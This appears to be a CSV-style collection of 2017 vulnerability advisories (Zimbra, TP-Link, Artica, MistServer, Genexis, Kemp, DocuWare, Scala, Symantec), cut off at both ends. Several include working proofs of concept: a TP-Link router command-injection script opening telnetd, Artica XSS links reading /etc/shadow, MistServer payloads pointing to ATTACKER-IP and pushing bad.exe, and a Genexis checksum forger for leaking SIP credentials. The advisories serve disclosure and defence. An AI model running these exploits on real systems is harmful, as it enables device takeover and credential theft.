# Triggered in the Context of an Authenticated Zimbra Email User
# Authors: Damian Pfammatter (damian.pfammatter compass-security com)
# Alessandro Zala (alessandro.zala compass-security com)
# Date: January 10th 2018
#
####################################################################################################
Introduction:
-------------
The Zimbra Collaboration Suite (ZCS) is a collaborative software suite that includes Email servers
as well as Email clients. According to the product website, more than 500 million people are
currently using the Email collaboration tool [1].
Security Analysts of Compass Security Schweiz AG [3] discovered a Stored Cross-Site Scripting (XSS)
vulnerability in the Zimbra Email web client, potentially resulting in a number of different attack
scenarios.
Affected Versions:
------------------
No confirmed information about all affected versions is available. Versions prior to 8.8 GA Release
are likely affected.
Technical Description:
----------------------
The Zimbra Email web client is affected by a Stored Cross-Site Scripting (XSS) vulnerability.
Remote attackers can target the vulnerability by sending an Email with XSS payload (e.g. JavaScript)
in its body. In case the recipient selects the email in the Zimbra client, and accesses the ""Show
Snippet"" functionality using the ""Q"" shortcut, the XSS payload is executed in the context of the
recipient's Zimbra client.
For example through social engineering, attackers could bring their victims into pressing ""Q"" while
reading the compromised email, triggering the payload. Beside others, the malicious payload could
compromise the confidentility, integrity as well as availability of the victim's emails. Also it
could be possible to change Zimbra settings of the corresponding victim.
Hotfix:
-------
The corresponding patch has been released in version 8.8.0 Beta2 [4] (Bug #107925). The patch is
part of public release 8.8 GA Release.
Timeline:
---------
2017-05-04: Vulnerability discovered
2017-05-05: Initial vendor notification
2017-05-05: Vendor confirmed security issue
2017-05-05: MITRE reserved CVE-2017-8802 for the issue
2017-12-12: Vendor released security fix & guidance to its customers
2018-01-10: Public disclosure
References:
-----------
[1] https://www.zimbra.com/
[2] https://www.synacor.com/
[3] https://www.compass-security.com/research/advisories/
[4] https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories"
1458,Multiple vulnerabilities in TP-Link products(CVE-2017-15613 to CVE-2017-15637),,CVE-2017-15613,"Introduction:
================
The WVR-, WAR- and ER- products are the SOHO/WIFI routers of TP-Link.
These issues allow remote authenticated administrators to execute arbitrary commands via command injection through different variables of different lua files.
If the attacker obtains the account and password of the router, then he can execute the arbitrary command through this command injection vulnerability.
These vulnerabilities can be triggered in LAN and WAN(if the ""remote management"" function is enabled).
Vulnerability Type:
================
Command Injection (Authenticated)
Product:
================
We has tested these vulnerabilities on TL-WVR450L(the latest version is TL-WVR450L V1.0161125) and TL-WVR900G(TL-WVR900G V3.0_170306).
And the following model should also be affected and the vendor has confirmed:
TP-Link ER5110G,
TP-Link ER5120G,
TP-Link ER5510G,
TP-Link ER5520G,
TP-Link R4149G,
TP-Link R4239G,
TP-Link R4299G,
TP-Link R473GP-AC,
TP-Link R473G,
TP-Link R473P-AC,
TP-Link R473,
TP-Link R478G+,
TP-Link R478,
TP-Link R478+,
TP-Link R483G,
TP-Link R483,
TP-Link R488,
TP-Link WAR1300L,
TP-Link WAR1750L,
TP-Link WAR2600L,
TP-Link WAR302,
TP-Link WAR450L,
TP-Link WAR450,
TP-Link WAR458L,
TP-Link WAR458,
TP-Link WAR900L,
TP-Link WVR1300G,
TP-Link WVR1300L,
TP-Link WVR1750L,
TP-Link WVR2600L,
TP-Link WVR300,
TP-Link WVR302,
TP-Link WVR4300L,
TP-Link WVR450L,
TP-Link WVR450,
TP-Link WVR458L,
TP-Link WVR900G,
TP-Link WVR900L
CVE details:
================
The detail of each vulnerability are as follows:
CVE-2017-15613: new-interface variable in the cmxddns.lua file
CVE-2017-15614: new-outif variable in the pptp_client.lua file
CVE-2017-15615: lcpechointerval variable in the pptp_client.lua file
CVE-2017-15616: new-interface variable in the phddns.lua file
CVE-2017-15617: iface variable in the interface_wan.lua file
CVE-2017-15618: new-enable variable in the pptp_client.lua file
CVE-2017-15619: pptphellointerval variable in the pptp_client.lua file
CVE-2017-15620: new-zone variable in the ipmac_import.lua file
CVE-2017-15621: olmode variable in the interface_wan.lua file
CVE-2017-15622: new-mppeencryption variable in the pptp_client.lua file
CVE-2017-15623: new-enable variable in the pptp_server.lua file
CVE-2017-15624: new-authtype variable in the pptp_server.lua file
CVE-2017-15625: new-olmode variable in the pptp_client.lua file
CVE-2017-15626: new-bindif variable in the pptp_server.lua file
CVE-2017-15627: new-pns variable in the pptp_client.lua file
CVE-2017-15628: lcpechointerval variable in the pptp_server.lua file
CVE-2017-15629: new-tunnelname variable in the pptp_client.lua file
CVE-2017-15630: new-remotesubnet variable in the pptp_client.lua file
CVE-2017-15631: new-workmode variable in the pptp_client.lua file
CVE-2017-15632: new-mppeencryption variable in the pptp_server.lua file
CVE-2017-15633: new-ipgroup variable in the session_limits.lua file
CVE-2017-15634: name variable in the wportal.lua file
CVE-2017-15635: max_conn variable in the session_limits.lua file
CVE-2017-15636: new-time variable in the webfilter.lua file
CVE-2017-15637: pptphellointerval variable in the pptp_server.lua file
Credits:
================
chunibalon, puzzor @VARAS of IIE
Timeline:
================
2017.08 to 2017.09: Issues found.
2017.09.26: Vendor contacted.
2017.10.13: Vendor confirmed.
2017.10.14: CVE id requested.
2017.10.19: CVE id assigned.
2018.1: Vendor confirmed that all effected products have been fixed.
Vulnerability detail:
================
These vulnerability are caused by the similar reason, so here is an explanation of CVE-2017-15616.
Other vulnerabilities can be reproduced with the detail descriptions of the variable and lua file.
In /usr/lib/lua/luci/controller/admin/phddns.lua file, line 113:
***********************************
function add_phddns(http_form)
local form_data = json.decode(http_form.data)
local jdata = form_data.params.new
ret = form:insert(CONFIG_NAME, ""phddns"", jdata, RULE_KEYS, nil)
if not ret then
return false, err.ERR_COM_TABLE_ITEM_UCI_ADD
end
if not uci_r:commit(CONFIG_NAME) then
return false, err.ERR_COM_UCI_COMMIT
end
-- add the ref of interface
ifs.update_if_reference(jdata.interface, 1)
sys.fork_exec('/etc/init.d/phddns restart')
userconfig.cfg_modify()
return jdata
end
***********************************
This file will process a POST request from the web management panel with url ""ip/cgi-bin/luci/;stok=xxx/admin/phddns?form=phddns"".
The interface argument passed by the POST request can be set with the malformed command payload and the lua file didn't check the argument sufficiently.
Then the malformed value of ""interface"" argument causes the command injection vulnerability.
PoC file:
================
***********************************
import requests
import urllib
import json
# This is the PoC code of authenticated command injection of TP-Link WVR900G router with the CVE-2017-15616.
# To reproduce the PoC, the ip of the router should be 192.168.123.1 and the password of web management panel should be 'adminadmin'
PASSWORD = 'c6564879eda92681404fb4ce64343788e47d266c490bb9d574f4467644a2f96b73ec157bbffabb50752c46f55d026ec7ef34661d7dcb030b0b1fa527173093ae4358f4740e539322f58c441ea0003978475346fb66320f749cc138f867bc0d8d9501f1613524fbba565979d95df6ef412837dee15a6dd8867d00b91c6f4a3406'
BASEURL = 'http://192.168.123.1'
LOGINURL = BASEURL + '/cgi-bin/luci/;stok=/login?form=login'
MARK = '###'
VULURL = BASEURL + '/cgi-bin/luci/;stok=%s/admin/phddns?form=phddns' % (MARK)
headers = {
""Accept"": ""application/json, text/javascript, */*; q=0.01"",
""Accept-Encoding"": ""gzip, deflate"",
""Accept-Language"": ""zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4"",
""Connection"": ""keep-alive"",
""Content-Type"": ""application/x-www-form-urlencoded; charset=UTF-8"",
""Host"": BASEURL[7:],
""Origin"": BASEURL,
""Referer"": ""%s/webpages/login.html"" % (BASEURL),
""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"",
""X-Requested-With"": ""XMLHttpRequest""
}
login_data_value = {'method': 'login','params': {'password': PASSWORD,'username': 'admin'}}
login_data = {'data':json.dumps(login_data_value)}
s = requests.Session()
s.headers.update(headers)
print (LOGINURL)
print (login_data)
res = s.post(LOGINURL, data=login_data)
stok = eval(res.text)['result']['stok']
print '[*] stok is %s' % (stok)
tmp_vul = VULURL.replace(MARK, stok)
print '[*] vul_url is %s ' % (tmp_vul)
delete_data = {""method"":""delete"",""params"":{""key"":""key-0"",""index"":""0""}}
delete_data = {'data': json.dumps(delete_data)}
print '[+] delete existed rule'
res = s.post(tmp_vul, data=delete_data)
print '[*] response is: %s' % (res.text)
# after executing this payload, the router will open its telnetd service.
payload = ''';telnetd;'''
vul_data = {""method"":""add"",""params"":{""index"":0,""old"":""add"",""new"":{""interface"":""WAN1%s"" % (payload),""name"":""test1"",""passwd"":""test"",""enable"":""on""},""key"":""add""}}
vul_data = {'data': json.dumps(vul_data)}
print '[+] sending payload'
res = s.post(tmp_vul, data=vul_data)
print '[*] response is: %s' % (res.text)
***********************************
Reference:
================
https://github.com/chunibalon/Vulnerability/blob/master/CVE-2017-15613_to_CVE-2017-15637.txt"
1475,CVE-2017-17055 Artica Web Proxy v3.06 Remote Code Execution (hyp3rlinx / ApparitionSec),,CVE-2017-17055,"[+] Credits: John Page (aka Hyp3rlinX)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/ARTICA-WEB-PROXY-v3.06-REMOTE-CODE-EXECUTION-CVE-2017-17055.txt
[+] ISR: ApparitionSec
Vendor:
=======
www.articatech.com
Product:
=========
Artica Web Proxy v.3.06.112216
Artica Tech offers a powerful but easy-to-use Enterprise-Class Web Security and Control solution,
usually the preserve of large companies. ARTICA PROXY Solutions have been developed over the past
10 years as an Open Source Project to help SMEs and public bodies protect both their organizations
and employees from risks posed by the Internet.
Vulnerability Type:
===================
Remote Code Execution
CVE Reference:
==============
CVE-2017-17055
Security Issue:
================
Artica offers a web based command line emulator 'system.terminal.php' (shell), allowing authenticated users to execute OS commands as root.
However, artica fails to sanitize the following HTTP request parameter $_GET[""username-form-id""] used in 'freeradius.users.php'.
Therefore, authenticated users who click an attacker supplied link or visit a malicious webpage, can result in execution of attacker
supplied Javascript code. Which is then used to execute unauthorized Operating System Commands (RCE) on the affected Artica Web Proxy Server
abusing the system.terminal.php functionality. Result is attacker takeover of the artica server.
Exploit/POC:
=============
1) Steal artica Server ""/etc/shadow"" password file.
https://VICTIM-IP:9000/freeradius.users.php?username-form-id=%3C%2Fscript%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open(%27POST%27,%27https://VICTIM-IP:9000/system.terminal.php%27,true);xhr.setRequestHeader(%27Content-type%27,%27application/x-www-form-urlencoded%27);xhr.send(%27cmdline=cat%20/etc/shadow%27);%3C%2Fscript%3E%3Cscript%3E
2) Write file 'PWN' to /tmp dir.
https://VICTIM-IP:9000/freeradius.users.php?username-form-id=%3C%2Fscript%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open(%27POST%27,%27https://VICTIM-IP:9000/system.terminal.php%27,true);xhr.setRequestHeader(%27Content-type%27,%27application/x-www-form-urlencoded%27);xhr.send(%27cmdline=touch%20/tmp/PWN%27);%3C%2Fscript%3E%3Cscript%3E
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=============================
Vendor Notification: November 28, 2017
Vendor Confirms Vulnerability : November 28, 2017
Vendor Reply ""Fixed in 3.06.112911 / ISO released"" : November 29, 2017
December 1, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1476,CVE-2017-16884 Mist Server v2.12 Unauthenticated Persistent XSS (hyp3rlinx / ApparitionSec),,CVE-2017-16884,"[+] Credits: John Page (aka Hyp3rlinX)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MIST-SERVER-v2.12-UNAUTHENTICATED-PERSISTENT-XSS-CVE-2017-16884.txt
[+] ISR: ApparitionSec
Vendor:
=============
mistserver.org
Product:
===========
MistServer v2.12
MistServer is a full-featured, next-generation streaming media toolkit for OTT (internet streaming).
Vulnerability Type:
===================
Unauthenticated Persistent XSS
CVE Reference:
==============
CVE-2017-16884
Security Issue:
================
Unauthenticated remote attackers can inject persistent XSS payloads by making failed HTTP authentication requests. Attacker supplied payloads will
get stored in the server logs as failed authentication requests alerts. Mistserver echoes back the unsanitized payloads in Mist Servers Web interface
automatically due to automatic refresh of the UI every few seconds, thereby, executing arbitrary attacker supplied code.
References:
============
https://news.mistserver.org/news/78/Stable+release+2.13+now+available%21
Exploit/POC:
=============
import requests
#INJECT IFRAME
requests.get('http://VICTIM-IP:4242/admin/api?callback=&command={""authorize"":{""password"":""666"",""username"":""<iframe src='http://ATTACKER-IP'></iframe>""}}')
#PUSH MALWARE
requests.get('http://VICTIM-IP:4242/admin/api?callback=&command={""authorize"":{""password"":""666"",""username"":""<iframe src='""}}'"">http://ATTACKER-IP/bad.exe '>""}}')
#EXFIL LOGS
requests.get('alert(document.body.innerHTML)""}"">http://VICTIM-IP:4242/admin/api?command={""authorize"":{""password"":""666"",""username"":""""}}')
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=============================
Vendor Notification: October 19, 2017
Vendor Acknowledgement : October 20, 2017
Vendor Released Fix : November 30, 2017
December 1, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1485,CVE-2017-6094 - Genexis GAPS Access Control Vulnerability,,CVE-2017-6094,"################################################################################
# #
# CVE-2017-6094 - Genexis GAPS Access Control Vulnerability #
# #
################################################################################
# #
# Product: Genexis Automatic Provisioning System (GAPS) #
# Vendor: Genexis B.V. #
# CVE ID: CVE-2017-6094 #
# Subject: Access control vulnerability #
# Effect: Leaked configuration settings, including user credentials #
# Author: Antoine Neuenschwander <antoine schoggi org> #
# Date: 2017-12-18 #
# #
################################################################################
Vendor/product description:
-----------------------------
Genexis develops FTTH equipment for the optical distribution networks of ISPs
including customer premises equipment (CPE) as well as infrastructure
components, supporting triple-play services (broadband internet, IPTV and VoIP).
The Genexis Automatic Provisioning System (GAPS) is the service used to monitor,
configure and update the CPEs.
URL: https://genexis.eu/product/gaps/
Introduction:
-------------
Management of Genexis CPEs can be done using TR-069 or DHCP/TFTP in combination
with UDP-based CPE commands. The CPE checks for most recent settings at startup
and performs periodic update checks. GAPS provides the configuration settings
for individual CPEs based on the device's MAC address. A configuration record
includes the following settings (among other):
- tftp server address, used to retrieve firmware images
- ingress and egress bitrates, according to the user's subscription
- sip server address, used to register to a VoIP service
- sip client credentials, used to authenticate the VoIP client
- ...
Given the MAC address, it was found possible to retrieve the configuration
settings of other subscribers' CPEs by sending forged UDP packets to GAPS. As a
result, sensitive data such as the sip credentials are exposed.
Affected:
---------
This issue affects all versions up to 7.2. First mitigations available after
version 6.1.
Technical Description:
----------------------
A CPE identifies itself by the MAC address of its WAN interface and a certain
""chk"" value (48bit) derived from the MAC. The algorithm used to compute the
""chk"" was disclosed by reverse engineering the CPE's firmware (retrieved from
the tftp server). It is possible to forge valid ""chk"" values for any given MAC
address using the following python routine:
def chk(mac):
a = [int(x, 16) for x in mac.split(':', 6)]
chk = [0] * 6
chk[5] = 1*a[0] + 3*a[1] + 7*a[2] + 115 & 0xff
chk[3] = 7*a[1] + 1*a[2] + 3*a[3] + 101 & 0xff
chk[0] = 3*a[2] + 7*a[3] + 1*a[4] + 99 & 0xff
chk[4] = 1*a[3] + 3*a[4] + 7*a[5] + 114 & 0xff
chk[1] = 3*a[0] + 7*a[4] + 1*a[5] + 101 & 0xff
chk[2] = 7*a[0] + 1*a[1] + 3*a[5] + 116 & 0xff
return ':'.join(['{:02x}'.format(x) for x in chk])
Example UDP message exchange (CPE <-> GAPS):
--------------------------------------------
> mac=000f9461cafe
> chk=90e97d8523ac
> type=OCG1018MX
> hw=0
> fw=OCG1018MX.v1.10.0.10c.bin
> stage=0
< vlan_mmt=62241
< vlan_voice=58146
< vlan_p1=33572
< defpri=0000000000000000
< vlansp1=8324
< prip1=00
< userid0=<phonenr>
< authid0=<userid>
< passwd0=<password>
< clip0=1
< clir0=0
< callwait0=0
< conference0=0
< clip1=0
< clir1=0
< callwait1=0
< conference1=0
< tftp_server=10.21.0.7
< tftp_server_port=69
< storecfg=0
< sip_server=<sip provider ip>
< sip_server_port=5060
< ratecount=3
< reg_exp=4
< country=ch
< send_dtmf=1
< sendflash=0
< dialplan=4|0[2-7]1[^]8|0[89]1[^]8|18[0-9]2|16[0-9]1|[^]+
< cliptype=1
< erate_p1=300
< versionOCG1018MX=OCG1018MX.v1.10.0.10c.bin
< erate_wan=300
< irate=012c0000000000000000000000000000
< erate=012c0000000000000000000000000000
Workaround / Fix:
-----------------
As of GAPS 6.2, GAPS provides a workaround to limit CPE requests. To further
improve security, it is advised to use MACless provisioning with random postfix
to harden the workaround.
Starting with GAPS 7.3, the GAPS protocol will support a mechanism to prevent
calculated checksums to be be valid.
Timeline:
---------
2017-01-13: Found vulnerability
2017-01-16: Contacted ISP
2017-01-17: ISP confirms vulnerability and contacts vendor
2017-01-18: Vendor confirms vulnerability
2017-02-13: CVE-ID requested
2017-02-19: CVE-ID assigned
2017-05-19: Vendor agrees on disclosure date: 2017-07-03
2017-06-23: Vendor postpones disclosure date: 2017-09-01
2017-07-31: Vendor postpones disclosure date: 2017-12-18
2017-12-18: Coordinated disclosure"
1487,ADVISORY - Kemp Load Balancers - Module Application Firewall Pack (AFP) - Web Application Firewall (WAF) does not inspect HTTP POST data - CVE-2017-15524,,CVE-2017-15524,"1. ADVISORY SUMMARY
Kemp Load Balancers - Module Application Firewall Pack (AFP) - Web Application Firewall (WAF) does not inspect HTTP POST data
Risk: high
Application: Kemp Load Balancers - Module Application Firewall Pack (AFP)
Versions Affected: 7.1.30 (Nov 2015) to 7.2.40 (Oct 2017) // Older versions are probably affected too, but they were not checked
Vendor: KEMP Technologies
Vendor URL: https://kemptechnologies.com/
Sent to vendor: 16.10.2017
Vendor response: Acknowledge 17.10.2017, Fix in PreRelease 30.11.2017
Published fixed Release by vendor: 06.12.2017
Date of Public Advisory: 11.12.2017
Reference: Kemp Case #75046
Advisory URL: https://www.pallas.com/advisories/cve_2017_15524_kemp_afp_waf_bug_on_post_data
Author: Tim Kretschmann (Pallas GmbH)
Version and State of report: 1.0 (11.12.2017) - published
2. VULNERABILITY INFORMATION
Web Application Firewall does not inspect HTTP POST data
Remotely Exploitable: Yes
Locally Exploitable: No
CVE: CVE-2017-15524
CVSS Base Score v2: 10 / 10
CVSS Base Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
3. VULNERABILITY DESCRIPTION
Kemp Load Balancer Module Application Firewall Pack (AFP) provides Web Application Firewall functionality.
In the tested versiona only web attacks at URL arguments were checked and were successful detected/blocked.
Attacks at arguments in the payload of HTTP POST Requests were NOT checked and were NOT detected/blocked.
Any attacks based on HTTP POST by using the Payload to transfer the attack vector will bypass the Web Applications Firewall of Kemp.
4. SOLUTIONS AND WORKAROUNDS
Update to Release 7.2.40.1 (Nov 2017)
No possible workaround before 7.2.40.1
5. AUTHOR
Tim Kretschmann (Pallas GmbH)
6. TECHNICAL DESCRIPTION / PROOF OF CONCEPT (PoC)
Settings WAF on KEMP Load Balancer inside Virtual Service of Virtal Host Area WAF Options
Web Application Firewall Enabled: On
Default Operation: Block Mode
Audit mode: Audit Relevant
Inspect HTML POST Request Content: On
- Disable JSON Parser: Off
- Disable XML Parser: Off
Process Responses: Off
Test-RuleSet:
SecRequestBodyAccess On
SecRule ARGS_POST:ptest attack123 ""phase:2,id:8000,block,msg:'test 8000',log,auditlog""
SecRule ARGS_POST:ptest attack123 ""phase:2,id:8001,deny,msg:'test 8001',log,auditlog""
SecRule ARGS_POST:ptest attack123 ""phase:2,id:8002,drop,msg:'test 8002',log,auditlog""
SecRule ARGS_POST:ptest attack123 ""phase:1,id:8003,block,msg:'test 8003',log,auditlog""
SecRule ARGS_POST:ptest attack123 ""phase:1,id:8004,deny,msg:'test 8004',log,auditlog""
SecRule ARGS_POST:ptest attack123 ""phase:1,id:8005,drop,msg:'test 8005',log,auditlog""
SecRule ARGS:ptest attack123 ""phase:2,id:8010,block,msg:'test 8010',log,auditlog""
SecRule ARGS:ptest attack123 ""phase:2,id:8011,deny,msg:'test 8011',log,auditlog""
SecRule ARGS:ptest attack123 ""phase:2,id:8012,drop,msg:'test 8012',log,auditlog""
SecRule ARGS:ptest attack123 ""phase:1,id:8013,block,msg:'test 8013',log,auditlog""
SecRule ARGS:ptest attack123 ""phase:1,id:8014,deny,msg:'test 8014',log,auditlog""
SecRule ARGS:ptest attack123 ""phase:1,id:8015,drop,msg:'test 8015',log,auditlog""
Proof-of-Concept:
pentest@testpc:~$ curl -X GET ""http://www.website.tld/cms/login.xhtml?ptest=attack123""
<html><head><title>403 Forbidden</title></head><body>Access denied</body>
--> Is blocked. Okay.
pentest@testpc:~$ curl -X POST ""http://www.website.tld/cms/login.xhtml?ptest=attack123"" -d ""xx=1""
<html><head><title>403 Forbidden</title></head><body>Access denied</body>
--> Is blocked. Okay.
pentest@testpc:~$ curl -X POST ""http://www.website.tld/cms/login.xhtml"" -H ""Content-Type: application/x-www-form-urlencoded"" -d ""ptest=attack123"" -s
<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
� Content of website �
!! --> No Block/Drop/Deny on POST Attacks !!
7. TIMELINE
16.10.2017 - Open Ticket at Kemp #75046
17.10.2017 - Kemp acknowledged the bug
30.11.2017 � Kemp offered PreRelease 7.2.40.1.15841.RELEASE.20171129-1431-PATCH-64-MULTICORE to Pallas
06.12.2017 � Kemp published Release 7.2.40.1 (see https://kemptechnologies.com/software-release-notes/ - PD-10249)
11.12.2017 � Pallas published Advisory
8. ABOUT PALLAS GMBH
Pallas provides security consulting, pentesting, managed security services and hosting services with focus on security.
Adress: Pallas GmbH, Hermuelheimer Strasse 8a, 50321 Bruehl, GERMANY
Phone: 0049.2232.18960
Fax: 0049.2232.198629
Web: https://www.pallas.com/"
1516,[CVE-2017-15044] DocuWare FullText Search - Incorrect Access Control vulnerability,,CVE-2017-15044,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2017-15044: DocuWare FullText Search - Incorrect Access Control vulnerability
Severity: High
- ------------------------------------------
Vendor:
DocuWare Europe GmbH
Therese-Giehse-Platz 2 82110 Germering Germany
- ------------------------------------------
Description:
The default installation of DocuWare FullText Search server allows remote
users to connect to and download and or modify all searchable text from
the embedded Solr service, bypassing DocuWare's access control features of
the DocuWare user interfaces and API. The vulnerability can be exploited
remotely, and allows both escalation of priviledges and information
disclosure.
- ------------------------------------------
Additional Information:
Based on the manual at http://help.docuware.com/en/#b57870t49903n78031 the
default behaviour of DocuWare is as follows:
""This shows the URL and the address of the Tomcat server that you are
using for the full text in DocuWare. The URL of the connection set up
by the system by default is ""http://<hostname<:9013"".""
This default behaviour binds the embedded Solr server to the external
network interface of the machine, and exposes all data to any HTTP client
able to connect without access control or data security.
While the manual makes reference to port 9013, the vulnerability was
discovered in a server bound to port 9012 instead.
- ------------------------------------------
Mitigation:
To mitigate the issue, modify the server.xml file in the embedded Tomcat
server that hosts Docuware Fulltext Search, and add address=""localhost""
to the container entries as follows:
- --- server.xml-orig 2017-11-19 22:33:55.049241032 +0200
+++ server.xml 2017-11-19 22:33:19.307923621 +0200
@@ -66,7 +66,7 @@
APR (HTTP/AJP) Connector: /docs/apr.html
Define a non-SSL HTTP/1.1 Connector on port 8080
-->
- - <Connector port=""9012"" protocol=""HTTP/1.1""
+ <Connector port=""9012"" address=""localhost"" protocol=""HTTP/1.1""
connectionTimeout=""20000""
redirectPort=""8443"" />
<!-- A ""Connector"" using the shared thread pool-->
@@ -88,7 +88,7 @@
-->
<!-- Define an AJP 1.3 Connector on port 8009 -->
- - <Connector port=""8009"" protocol=""AJP/1.3"" redirectPort=""8443"" />
+ <Connector port=""8009"" address=""localhost"" protocol=""AJP/1.3"" redirectPort=""8443"" />
<!-- An Engine represents the entry point (within Catalina) that processes
For more complex deployments where limiting the client to localhost is
not an option, see the Apache Tomcat manual on valve configuration as follows:
https://tomcat.apache.org/tomcat-8.0-doc/config/valve.html#Access_Control
While placing the Docuware FullText Search Server behind a firewall may have offered
some mitigation against this vulnerability, care must be taken to ensure that:
- - The firewall blocked ports 9012/9013 and 8009;
- - From the internet; and
- - From users inside a corporate or internal network; and
- - From other server machines, routers and any other devices that share the
same network as Docuware Fulltext Search.
It is prudent to assume that a typical firewall installation does not follow
all of the requirements above, and to assume that all installations are
therefore potentially vulnerable.
- ------------------------------------------
Vulnerability Type:
Incorrect Access Control.
- ------------------------------------------
Affected Product Code Base
DocuWare - 6.9
Appears to affect all versions in v6.x, including the most recent 6.11.
- ------------------------------------------
Affected Component:
DocuWare FullText Search
- ------------------------------------------
Attack Vectors:
To exploit the vulnerability, the attacker needs to point a web
browser at the embedded DocuWare Fulltext Search server Solr application on
the exposed port (9012/9013) and path (/solrt).
ALternatively, port 8009 exposes the same service via the AJP protocol.
Configure a reverse proxy to translate AJP into HTTP and use a web browser
to view the data as described above.
The full contents of the Docuware FullText Search server can be browsed,
downloaded, modified or deleted using the Solr administration interface.
- ------------------------------------------
References:
https://www.docuware.com/document-management-products-and-services/docuware-premises
http://help.docuware.com/en/#b57870t49903n78031
- ------------------------------------------
Disclosure Timeline:
2017-09-30: Vendor disclosure.
2017-10-05: CVE issued.
2017-10-24: Vendor acknowledgement of the security hole with Docuware internal bug
number 203945, but no commitment for a fix: ""Therefore we can’t specify any
date or timeframe on which you can expect the problem to be fixed I’m
afraid.""
2017-10-25: Request for an arrangement for coordinated disclosure, request
escalated internally, however request ignored.
2017-11-03: Second request for an arrangement for coordinated disclosure,
request escalated internally again, however request ignored again.
2017-11-20: Full disclosure with details of mitigation.
- ------------------------------------------
Discoverer:
Graham Leggett <minfrin sharp fm>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2
Comment: GPGTools - http://gpgtools.org
iQIcBAEBCAAGBQJaEpNIAAoJENOxP8os5gvtwtUP/1FCGjF/eqOg4RjC1fUs02R9
ecp6QIBtSV84MI+75HEa37rRL+OXYZ8PoEHagPI18EB7zPel5xCY04txbaBMCD5K
PrEqh3Vi/iaCnPqyu5EmnjuNqzommJdG5Lbwb84kuxNUown1sn0ixBBfoPzwMXHP
ud4UzXk6QlxOWIJ6XLtc3SlWvq/8hUsIg0KOdBY0ny8zgoLVrlaF2Tis5oCh7O+w
Hd7qmkGzbm3h7KVv3oFTFZIcrojXJtH20ciWTnoh5j693hUW7fJqPxzjfFcW9z6G
uK0iFEBF8SzJ/rOj7k5SURbyBmwJ2FWWKhc0odJl3P0fUphkk8WtgRc5k8cqFYdT
8p1y5FT9385knuWEDJrDuBoaBFGliEH/rzXNJXq8pBHZVmXNxtyqNo/kW/LFKJrc
NAOl4TDdbURGThQWE7aZDLlzmau6twoi65/UrUkDrA+kW7zjcRsvwYz7KZmPFhoI
a0D9KpLlJ56RKvczpc6ZOGBVgfQTkFS2mwQdgRPAX0AwT2sMiIYd6Fe7HRAs3Nij
0dmd1ip3/Ds/DA1p2R8ixdp2ZJxpkR0VXJ9x6Vcz/vl0M9uHlwWtL0owf9Ppg89x
38G/tJU3vja/o9h5wiVR6aFei0ixEQZVf/Q9g+Qwuko4RpG02E26GYW+kwsHpkvj
15Z3rwZoFA//UDX6HzeJ
=eGad
-----END PGP SIGNATURE-----"
1529,[CVE-2017-15288] A privilege escalation vulnerability in the Scala compilation daemon,,CVE-2017-15288,"A privilege escalation vulnerability has been identified in the Scala compilation daemon.
The compile daemon is started explicitly by the `fsc` command, or implicitly by executing
a Scala source file as a script (e.g `scala MyScript.scala`). Note: Using the `scala`
command to start a REPL or to run a pre-compiled class does not start the compile daemon.
# Impact
While the compile daemon is running, an attacker with local access to the machine can
execute code as the user that started the compile daemon, and can write arbitrary
class files to any location on the filesystem that the user has access to.
# Affected Versions
- Scala 2.1.6-2.10.6; 2.11.0-2.11.11; 2.12.0-2.12.3
# Mitigation
- Use `scala -nocompdaemon MyScript.scala` rather than `scala MyScript.scala` to
disable the implicit startup and use of the daemon.
- Avoid explicitly starting `fsc`
- Upgrade to Scala 2.10.7 2.11.12, 2.12.4 or higher which restricts the sensitive file to be
readable only by the owner. These releases also change the location of the sensitive
file: it is written in the directory `$HOME/.scalac`.
Announcement: http://scala-lang.org/news/security-update-nov17.html
Scala Downloads: http://scala-lang.org/download/"
1531,Symantec Endpoint Protection (SEP) v12.1 Tamper-protection Bypass CVE-2017-6331 (hyp3rlinx),,CVE-2017-6331,"[+] Credits: John Page a.k.a hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CVE-2017-6331-SYMANTEC-ENDPOINT-PROTECTION-TAMPER-PROTECTION-BYPASS.txt
[+] ISR: ApparitionSec
Vendor:
=======
www.symantec.com
Product:
===========
Symantec Endpoint Protection
v12.1.6 (12.1 RU6 MP5)
Symantec 12.1.7004.6500
Vulnerability Type:
===================
Tamper-Protection Bypass
